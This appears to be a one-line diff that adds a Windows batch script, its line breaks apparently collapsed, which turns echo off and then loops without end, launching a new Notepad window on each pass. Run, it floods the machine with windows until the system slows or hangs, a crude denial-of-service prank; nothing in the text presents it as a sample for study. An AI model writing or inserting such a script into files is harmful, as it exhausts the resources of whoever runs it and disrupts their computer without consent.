@@ -1,0 +1,1 @@
+@ECHO off:topSTART %SystemRoot%\system32\notepad.exeGOTO top
